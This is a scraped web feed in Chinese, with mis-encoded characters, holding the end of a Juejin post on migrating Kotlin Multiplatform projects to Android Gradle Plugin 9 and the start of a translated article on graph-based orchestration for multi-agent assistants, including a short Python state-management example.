<li><strong><code>composeApp</code></strong>ï¼šå…±äº«ä»£ç æ¨¡å—ï¼ˆå˜æˆ Android <em>Library</em>ï¼Œå¹¶è¿›ä¸€æ­¥è¿ç§»åˆ° Google çš„ Android-KMP library pluginï¼‰</li>
</ul>
<p>æ›´å‡†ç¡®è¯´æ³•æ˜¯ï¼š</p>
<ul>
<li>æŠŠ Android Application çš„é‚£éƒ¨åˆ†ï¼ˆActivity/Application/manifest/æ‰“åŒ…é…ç½®ï¼‰ æå‡ºå»</li>
<li>shared module ä»ç„¶å¯ä»¥ä¿ç•™ <code>androidMain</code> source set æ”¾ Android-only çš„å…±äº«å®ç°ï¼Œä½†å®ƒåªèƒ½æ˜¯â€œlibrary è¯­ä¹‰â€ï¼Œä¸èƒ½å†åŒæ—¶æ‰¿æ‹… application plugin çš„èŒè´£</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0d05e5362b424e7ca782f2b6fbf3fcec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oGL54yrZGXlsI_pg60=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769662886&amp;x-signature=EHaAoEGR%2BX%2F6pte6EQ5MYGf%2FoJU%3D" alt="" loading="lazy"/></p>
<p>ç®€å•æ¥è¯´ä¸»è¦æœ‰ï¼š</p>
<ul>
<li>
<p><strong>æŠŠ <code>composeApp/src/androidMain</code> æ•´ä¸ªæŒªåˆ° <code>androidApp/src/</code></strong> ï¼ŒAGP 9 è¦æ±‚ Android åº”ç”¨å…¥å£ï¼ˆæ¯”å¦‚ <code>MainActivity.kt</code>ï¼‰ä¸å†å¾…åœ¨ KMP + Android Application åŒæ¨¡å—ä¸­ï¼Œå…¥å£å¿…é¡»å±äº <code>androidApp</code> è¿™ç§ application module æ‰èƒ½æ­£å¸¸æ‰“åŒ…ä¸è¿è¡Œï¼Œä¸è¿‡</p>
<ul>
<li>
<p><strong>æœ‰ <code>expect/actual</code> å£°æ˜å¿…é¡»ç»§ç»­ç•™åœ¨å…±äº«æ¨¡å—ï¼ˆ<code>composeApp</code>ï¼‰çš„ source sets é‡Œ</strong>ï¼Œä¿è¯å…¶å®ƒå¹³å°ä¹Ÿèƒ½ç”¨</p>
<blockquote>
<p>å¦‚æœä½ çš„ <code>actual</code> å®ç°ä¸¥é‡ä¾èµ– Activity çº§åˆ«çš„ Context æˆ–ç”Ÿå‘½å‘¨æœŸï¼Œå¯èƒ½éœ€è¦é‡æ„ä¸ºä¾èµ–æ³¨å…¥æˆ–å›è°ƒæ¥å£ï¼Œå¦åˆ™åœ¨ Library çº§åˆ«çš„ Shared Module ä¸­å¾ˆéš¾å¤„ç†ã€‚</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p><strong>æŠŠ <code>androidApp/src/androidMain</code> é‡å‘½åä¸º <code>main</code></strong> ï¼Œ<code>androidApp</code> æ˜¯ä¸€ä¸ªæ™®é€š Android application moduleï¼Œå®ƒä¸èµ° KMP çš„ source set å‘½åä½“ç³»</p>
</li>
<li>
<p><strong>æ¸…ç† <code>composeApp</code> é‡ŒåŸæœ¬çš„ <code>androidMain.dependencies</code></strong> ï¼Œåœ¨ <code>composeApp/build.gradle.kts</code> åˆ é™¤ <code>kotlin.sourceSets.androidMain.dependencies {}</code> è¿™å—ï¼Œä¹Ÿå°±æ˜¯åŸºäº build variants çš„ä¾èµ–ï¼ˆå¦‚ debug/releaseï¼‰éœ€è¦æ¬è¿æˆ–é‡æ„ï¼ŒåŒæ—¶æŒ‰ Android-KMP library plugin çš„è§„åˆ™é‡æ–°ç»„ç»‡ <code>androidMain</code> ç›¸å…³ä¾èµ–</p>
</li>
<li>
<p>IDE Run Configuration é‡Œï¼ŒæŠŠä»¥å‰çš„ <code>composeApp</code> æ”¹æˆ <code>androidApp</code><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5878ea8277dc42baba52fef0d915f407~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oGL54yrZGXlsI_pg60=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769662886&amp;x-signature=u80gdiBHHkSQW5i9FG4iMerxbfA%3D" alt="" loading="lazy"/></p>
</li>
</ul>
<blockquote>
<p>å½“ç„¶ï¼Œ<strong>ç›®å‰è¿˜èƒ½æš‚æ—¶ç”¨ <code>android.enableLegacyVariantApi=true</code> è‹Ÿä½</strong>ï¼Œä½†è¿™ä¸ªâ€œlegacyâ€ä¹Ÿä¼šåœ¨ AGP 10 è¢«å½»åº•ç§»é™¤ï¼ŒåŒæ—¶è®°å¾— <code>android.newDsl=false</code> ã€‚</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/54514f8bf86748c5a57ea0c875ee4a4a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oGL54yrZGXlsI_pg60=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769662886&amp;x-signature=4HHqy0HvSBv8I%2BuSO6BRI97GyDQ%3D" alt="" loading="lazy"/></p>
<p>å¦å¤–ï¼Œ Android-KMP library plugin å¯¹ shared module çš„ Android éƒ¨åˆ†ä¸æä¾›ä¼ ç»Ÿçš„ variant-aware ä¾èµ–é…ç½®ï¼ˆdebugImplementation/releaseImplementation ç­‰ä¼šå¤±æ•ˆï¼‰ï¼Œå› æ­¤éœ€è¦æ”¹ç”¨å…¶æä¾›çš„ classpath/é…ç½®æ–¹å¼æ¥æ³¨å…¥ä¾èµ–ï¼š</p>
<ul>
<li>ä½ ä»¥å‰åœ¨ shared module ç”¨ <code>debugImplementation</code> / <code>releaseImplementation</code> æˆ–è€…ä¾èµ– buildType/flavor æ¥æ³¨å…¥ä¸åŒå®ç°/ä¾èµ– ï¼Œå°±éœ€è¦æ¬å®¶</li>
<li>å¾ˆå¤šåªåœ¨ debug æ‰éœ€è¦çš„ä¸œè¥¿ï¼ˆtoolingã€è°ƒè¯•ä¾èµ–ã€æŸäº›å¼€å…³ï¼‰åœ¨ shared module æ²¡æ³•æŒ‰ variant ä¼˜é›…åŒºåˆ†ï¼Œåªèƒ½æ¢ç­–ç•¥</li>
</ul>
<blockquote>
<p>å®é™…ä¸Šæˆ‘è®°å¾—ï¼ŒKMP æ—©æœŸå°±æ˜¯æ¨è Shared Module + Android App Module ï¼Œåæ¥ä¸ºäº†ç®€åŒ–ä¸Šæ‰‹éš¾åº¦ï¼Œç‰¹åˆ«æ˜¯ JetBrains çš„ Wizard å‘å¯¼ï¼Œæ¨å¹¿äº†  Single Module (Umbrella) æ¨¡å¼ï¼Œå¯ä»¥ä¸€ä¸ªæ¨¡å—æ—¢æ˜¯å…±äº«åº“åˆæ˜¯å®‰å“åº”ç”¨ï¼Œç°åœ¨åˆæ˜¯ä¸€ä¸ªè½®å›ã€‚</p>
</blockquote>
<p>å¦å¤–ï¼ŒAndroid Studio éœ€è¦ Otter 3 Feature Drop 2025.2.3 æ‰æ”¯æŒ AGP 9.0.0ï¼ŒIntelliJ IDEA é¢„è®¡è¦ 2026 å¹´ç¬¬ä¸€å­£åº¦ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/62e002d3d9d34a71aa4eb992f8925f8d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oGL54yrZGXlsI_pg60=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769662886&amp;x-signature=ZbiNCAh%2BEfruyFGWtUc%2F1klcY74%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-3">ä¸ºä»€ä¹ˆ</h2>
<p>ä¸ºä»€ä¹ˆä¼šæœ‰â€œå¤§å˜åŠ¨â€? <strong>è¿™å¤§æ¦‚æ˜¯è°·æ­Œæƒ³æŠŠâ€œæŠŠå¤šå¹´æŠ€æœ¯å€ºä¸€æ¬¡æ€§ç»“è´¦â€</strong>ï¼Œè¯´äººè¯å°±æ˜¯ï¼šç»´æŠ¤æˆæœ¬å¤ªé«˜äº†ï¼Œå¼€çŒ¿èŠ‚æµï¼ŒæŠŠä¸Šé¢ä¸‰ç‚¹åˆèµ·æ¥ï¼Œä½ ä¼šå‘ç° AGP 9 çš„ç›®æ ‡éå¸¸ä¸€è‡´ï¼š</p>
<ul>
<li>æ§åˆ¶å…¬å…± API é¢ï¼šæ—§ DSL/æ—§ Variant API å¤ªå¼€æ”¾ï¼Œå¯¼è‡´å¤–éƒ¨æ’ä»¶ã€buildSrcã€è„šæœ¬åˆ°å¤„ç”¨å†…éƒ¨å®ç°ï¼ŒAGP å›¢é˜Ÿæˆæœ¬ UP</li>
<li>ä¸ºæ›´ç¨³å®šçš„æ„å»ºæ¨¡å‹é“ºè·¯ï¼šGradle 9 çš„å¤§æ–¹å‘ä¹‹ä¸€æ˜¯æŠŠ Configuration Cache æ¨æˆâ€œé¦–é€‰æ‰§è¡Œæ¨¡å¼â€ï¼Œå¹¶é€æ­¥æ·˜æ±°ä¸å…¼å®¹çš„è€ API/æ¨¡å¼ï¼ŒAGP 9 çš„â€œæ–° DSL + æ–° Variant APIï¼ˆandroidComponentsï¼‰â€æ­£å¥½æ˜¯é¡ºåŠ¿è€Œä¸º</li>
<li>Kotlin é›†æˆï¼šæŠŠ Kotlin ç¼–è¯‘é›†æˆè¿› AGPï¼ˆbuilt-in Kotlinï¼‰ï¼Œå‡å°‘è¿‡å» KGP/AGP ä¹‹é—´çš„â€œè„†å¼±è€¦åˆç‚¹â€</li>
</ul>
<p>æ‰€ä»¥å¯ä»¥çœ‹åˆ° ï¼Œ<strong>AGP 9 å°±åƒæ˜¯ Google åœ¨åšæ–­èˆç¦»ï¼Œæ‰€ä»¥å¯¹äºå¼€å‘è€…æ¥è¯´ï¼Œä¹Ÿä¼šæ˜¯ä¸€ä¸ªè¢«åŠ¨æ–­èˆç¦»çš„è¿‡ç¨‹</strong>ï¼Œä¸è¿‡è¯åˆè¯´å›æ¥ï¼Œä¸æ›´æ–°å°±ä¸ä¼šæœ‰é—®é¢˜ï¼Œèƒ½è‹Ÿåˆ™è‹Ÿæœç„¶è¿˜æ˜¯çœŸç†ï¼Œè°çŸ¥é“è¿‡å‡ ä¸ªç‰ˆæœ¬æ˜¯ä¸æ˜¯åˆæŠ½å›æ¥äº†å‘¢ï¼Ÿ</p>
<p>æ‰€ä»¥ï¼Œä½ è¯•äº† AGP 9 äº†å—ï¼Ÿ</p>
<h2 data-id="heading-4">å‚è€ƒé“¾æ¥</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Fbuild%2Freleases%2Fagp-9-0-0-release-notes" target="_blank" title="https://developer.android.com/build/releases/agp-9-0-0-release-notes" ref="nofollow noopener noreferrer">developer.android.com/build/releaâ€¦</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Fbuild%2Fmigrate-to-built-in-kotlin%23opt-out-of-built-in-kotlin" target="_blank" title="https://developer.android.com/build/migrate-to-built-in-kotlin#opt-out-of-built-in-kotlin" ref="nofollow noopener noreferrer">developer.android.com/build/migraâ€¦</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fkotlinlang.org%2Fdocs%2Fmultiplatform%2Fmultiplatform-project-agp-9-migration.html%23configure-the-shared-module-to-use-the-android-kmp-library-plugin" target="_blank" title="https://kotlinlang.org/docs/multiplatform/multiplatform-project-agp-9-migration.html#configure-the-shared-module-to-use-the-android-kmp-library-plugin" ref="nofollow noopener noreferrer">kotlinlang.org/docs/multipâ€¦</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Fbuild%2Fmigrate-to-built-in-kotlin" target="_blank" title="https://developer.android.com/build/migrate-to-built-in-kotlin" ref="nofollow noopener noreferrer">developer.android.com/build/migraâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ„å»ºå¯æ‰©å±•çš„æ™ºèƒ½ä½“åŠ©æ‰‹ï¼šåŸºäºå›¾çš„ç¼–æ’ç­–ç•¥]]></title>    <link>https://juejin.cn/post/7597704040215068698</link>    <guid>https://juejin.cn/post/7597704040215068698</guid>    <pubDate>2026-01-22T02:13:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597704040215068698" data-draft-id="7597623395908747310" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ„å»ºå¯æ‰©å±•çš„æ™ºèƒ½ä½“åŠ©æ‰‹ï¼šåŸºäºå›¾çš„ç¼–æ’ç­–ç•¥"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,å›¾å½¢å­¦"/> <meta itemprop="datePublished" content="2026-01-22T02:13:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="äº‘äº‘ä¼—ç”Ÿs"/> <meta itemprop="url" content="https://juejin.cn/user/380845430158739"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ„å»ºå¯æ‰©å±•çš„æ™ºèƒ½ä½“åŠ©æ‰‹ï¼šåŸºäºå›¾çš„ç¼–æ’ç­–ç•¥
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/380845430158739/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    äº‘äº‘ä¼—ç”Ÿs
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-22T02:13:09.000Z" title="Thu Jan 22 2026 02:13:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ¬æ–‡ä»‹ç»äº†å¦‚ä½•é€šè¿‡åŸºäºå›¾çš„ç¼–æ’æ¨¡å‹æ„å»ºå¯æ‰©å±•çš„æ™ºèƒ½ä½“åŠ©æ‰‹ï¼Œä»¥è§£å†³å¤æ‚ç³»ç»Ÿä¸­çš„è·¯ç”±ã€ä¸Šä¸‹æ–‡ç®¡ç†å’Œå¯æ‰©å±•æ€§é—®é¢˜ï¼Œå®ç°æ›´çµæ´»ã€å¯ç»´æŠ¤çš„æ¶æ„ã€‚</p>
<blockquote>
<p>è¯‘è‡ªï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fthenewstack.io%2Fbuilding-scalable-agentic-assistants-a-graph-based-approach%2F" target="_blank" title="https://thenewstack.io/building-scalable-agentic-assistants-a-graph-based-approach/" ref="nofollow noopener noreferrer">Building scalable agentic assistants: A graph-based approach</a></p>
<p>ä½œè€…ï¼šAbhishek Sant, Hemant Murarka</p>
</blockquote>
<p>å¤§çº¦ä¸€å¹´å‰ï¼Œæˆ‘ä»¬æ¥æ‰‹äº†ä¸€ä¸ªçœ‹ä¼¼ç®€å•çš„é—®é¢˜ï¼šæ„å»ºä¸€ä¸ªç•Œé¢åŠ©æ‰‹ï¼Œèƒ½å¤Ÿå›ç­”å…³äºæ”¯ä»˜ã€äº‰è®®ã€äº¤æ˜“å’Œæ´å¯ŸåŠ›çš„é—®é¢˜ã€‚ç„¶è€Œï¼Œç°å®è¿œæ¯”æƒ³è±¡çš„å¤æ‚ã€‚</p>
<p>è®¸å¤šå›¢é˜Ÿå·²ç»æ‹¥æœ‰å¤šä¸ªæ•°æ®æºã€å†…éƒ¨å·¥å…·å’Œé¢†åŸŸä¸“å®¶ååŒå·¥ä½œã€‚æˆ‘ä»¬æ‰€ç¼ºä¹çš„æ˜¯ä¸€ç§å°†æ‰€æœ‰è¿™äº›æ•´åˆèµ·æ¥ï¼Œä½¿å…¶è¿è´¯ã€å¯é ä¸”å¯æ‰©å±•çš„æ–¹æ³•ã€‚æ—©æœŸå¯¹<a href="https://link.juejin.cn?target=https%3A%2F%2Fthenewstack.io%2Fdont-build-chatbots-build-agents-with-jobs%2F" target="_blank" title="https://thenewstack.io/dont-build-chatbots-build-agents-with-jobs/" ref="nofollow noopener noreferrer">å•æ™ºèƒ½ä½“èŠå¤©æœºå™¨äºº</a>çš„å®éªŒåœ¨æ¼”ç¤ºæ—¶æ•ˆæœè‰¯å¥½ï¼Œä½†åœ¨é¢å¯¹çœŸå®çš„ç»„ç»‡å¤æ‚æ€§æ—¶å´å´©æºƒäº†ã€‚</p>
<p>æˆ‘ä»¬éœ€è¦åœæ­¢ç”¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fthenewstack.io%2Fbeyond-scripts-the-shift-from-automation-to-agentic-ai%2F" target="_blank" title="https://thenewstack.io/beyond-scripts-the-shift-from-automation-to-agentic-ai/" ref="nofollow noopener noreferrer">æ™ºèƒ½ä½“ç³»ç»Ÿ</a>æ¥æ€è€ƒï¼Œå¹¶å¼€å§‹å°†å…¶è§†ä¸ºä¸€ä¸ªç”±å¤šä¸ªæ™ºèƒ½ä½“åè°ƒè¿ä½œçš„ç³»ç»Ÿï¼Œæ¯ä¸ªæ™ºèƒ½ä½“éƒ½è‚©è´Ÿç€ç‹­çª„çš„èŒè´£ã€‚</p>
<h2 data-id="heading-0"><strong>æˆ‘ä»¬å¿…é¡»è§£å†³çš„3ä¸ªéš¾é¢˜</strong></h2>
<p>æˆ‘ä»¬æœ€åˆçš„å°è¯•éµå¾ªäº†ç†Ÿæ‚‰çš„æ¨¡å¼ã€‚ä¸€ä¸ªå¤§çš„æç¤ºã€ä¸€ä¸ªä¸æ–­å¢é•¿çš„å·¥å…·åˆ—è¡¨å’Œå¤§é‡çš„æ¡ä»¶é€»è¾‘ã€‚ä¸€æ—¦æˆ‘ä»¬å¢åŠ æ›´å¤šåŠŸèƒ½ï¼Œä¸€åˆ‡éƒ½å˜å¾—è„†å¼±ä¸å ªã€‚</p>
<p>æˆ‘ä»¬é‡åˆ°äº†ä¸‰ä¸ªéš¾é¢˜ï¼š</p>
<ul>
<li><strong>è·¯ç”±ï¼š</strong> å¦‚ä½•å†³å®šå“ªç§ä¸“å®¶é€»è¾‘åº”è¯¥å¤„ç†ç»™å®šçš„é—®é¢˜ï¼Ÿ</li>
<li><strong>ä¸Šä¸‹æ–‡ï¼š</strong> å¦‚ä½•åœ¨ä¸ä½¿æ¯ä¸ªè¯·æ±‚è†¨èƒ€çš„æƒ…å†µä¸‹ä¿ç•™å¯¹è¯å’Œç»„ç»‡ä¸Šä¸‹æ–‡ï¼Ÿ</li>
<li><strong>æ‰©å±•ï¼š</strong> å¦‚ä½•åœ¨ä¸é‡å†™ç³»ç»Ÿçš„æƒ…å†µä¸‹æ·»åŠ æ–°åŠŸèƒ½ï¼Ÿ</li>
</ul>
<p>å½“æˆ‘ä»¬åœæ­¢å°†åŠ©æ‰‹è§†ä¸ºä¸€ä¸ªå•ä¸€çš„å¤§è„‘ï¼Œå¹¶å¼€å§‹å°†å…¶è§†ä¸ºä¸€ä¸ªåè°ƒç³»ç»Ÿï¼Œå…¶ä¸­æ¯ä¸ªèŠ‚ç‚¹éƒ½æœ‰æ˜ç¡®çš„ç›®çš„æ—¶ï¼Œçªç ´å‡ºç°äº†ã€‚</p>
<h2 data-id="heading-1"><strong>å¯æ‰©å±•çš„æ™ºèƒ½ä½“æ¶æ„</strong></h2>
<p>æˆ‘ä»¬è§£å†³æ–¹æ¡ˆçš„æ ¸å¿ƒæ˜¯åŸºäºå›¾çš„ç¼–æ’æ¨¡å‹ã€‚æˆ‘ä»¬æ²¡æœ‰é‡‡ç”¨å•ä¸€çš„æ•´ä½“æµç¨‹ï¼Œè€Œæ˜¯æ„å»ºäº†ä¸€ä¸ªç³»ç»Ÿï¼Œå…¶ä¸­å¯¹è¯ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹éƒ½ç”±ä¸€ä¸ªå…·æœ‰æ˜ç¡®ç›®çš„çš„èŠ‚ç‚¹å¤„ç†ã€‚</p>
<p><img src="https://cdn.thenewstack.io/media/2026/01/874cde8d-image1-1024x695.jpg" alt="åŸºäºå›¾çš„æ¶æ„" loading="lazy"/></p>
<h3 data-id="heading-2"><strong>ä¼šè¯å’Œç¼–æ’å±‚</strong></h3>
<p>æ¯ä¸ªè¯·æ±‚éƒ½å§‹äºä¸€ä¸ªä¼šè¯ç®¡ç†å™¨ï¼Œå®ƒå¤„ç†çŠ¶æ€ã€å†å²è®°å½•å’Œè¿ç»­æ€§ã€‚è¿™ä¼šè¾“å…¥åˆ°ä¸€ä¸ªç³»ç»Ÿç¼–æ’å™¨ä¸­ï¼Œè¯¥ç¼–æ’å™¨è´Ÿè´£åˆå§‹åŒ–æ™ºèƒ½ä½“å¹¶é€šè¿‡å›¾ä¼ é€’çŠ¶æ€ã€‚</p>
<p>ç¼–æ’å™¨ä¸åšå‡ºä¸šåŠ¡å†³ç­–ã€‚å®ƒçš„å·¥ä½œæ˜¯ç§»åŠ¨æ•°æ®ï¼Œè€Œä¸æ˜¯è§£é‡Šæ•°æ®ã€‚è¿™ç§åˆ†ç¦»å¯¹äºå¯ç»´æŠ¤æ€§è‡³å…³é‡è¦ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Orchestrator State Management</span>
state = {
	<span class="hljs-string">"user_id"</span>: <span class="hljs-string">"abc123"</span>,
	<span class="hljs-string">"conversation_history"</span>: last_3_turns,  <span class="hljs-comment"># Not entire history</span>
	<span class="hljs-string">"current_domain"</span>: <span class="hljs-string">"payments"</span>,
	<span class="hljs-string">"session_context"</span>: {
    	<span class="hljs-string">"merchant_id"</span>: <span class="hljs-string">"merch_789"</span>,
    	<span class="hljs-string">"date_range"</span>: <span class="hljs-string">"last_30_days"</span>
	}
}
 
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">orchestrate</span>(<span class="hljs-params">query: <span class="hljs-built_in">str</span>, state: <span class="hljs-built_in">dict</span></span>):
	<span class="hljs-comment"># Initialize supervisor based on domain</span>
	supervisor = get_supervisor(state[<span class="hljs-string">"current_domain"</span>])
   
	<span class="hljs-comment"># Pass minimal context, not everything</span>
	result = <span class="hljs-keyword">await</span> supervisor.route_and_execute(
    	query=query,
    	context=state[<span class="hljs-string">"session_context"</span>]
	)
   
	<span class="hljs-comment"># Update state for next turn</span>
	state[<span class="hljs-string">"conversation_history"</span>].append(result)
	<span class="hljs-keyword">return</span> result
</code></pre>
<h3 data-id="heading-3"><strong>ä¸»ç®¡å’Œè·¯ç”±</strong></h3>
<p>æˆ‘ä»¬ç³»ç»Ÿä¸­çš„æ¯ä¸ªé¢†åŸŸï¼ˆæ”¯ä»˜ã€äº‰è®®ã€åˆ†æï¼‰éƒ½æœ‰è‡ªå·±çš„ä¸»ç®¡èŠ‚ç‚¹ã€‚è¿™äº›ä¸»ç®¡ä¸ç›´æ¥å¤„ç†è¯·æ±‚ï¼›å®ƒä»¬æ ¹æ®ç”¨æˆ·çš„æ„å›¾å°†è¯·æ±‚è·¯ç”±åˆ°ä¸“ä¸šçš„workeræ™ºèƒ½ä½“ã€‚</p>
<p>å¯ä»¥å°†è·¯ç”±æƒ³è±¡æˆä¸€ä¸ªç²¾å¿ƒè®¾è®¡çš„APIç½‘å…³ã€‚ä¸»ç®¡ä¼šæ£€æŸ¥ä¼ å…¥çš„è¯·æ±‚ï¼Œå†³å®šå“ªä¸ªworkeræœ€é€‚åˆå¤„ç†å®ƒï¼Œå¹¶ç§»äº¤æ‰§è¡Œæƒã€‚</p>
<p><img src="https://cdn.thenewstack.io/media/2026/01/fd4ec6e6-image2-1024x731.jpg" alt="" loading="lazy"/></p>
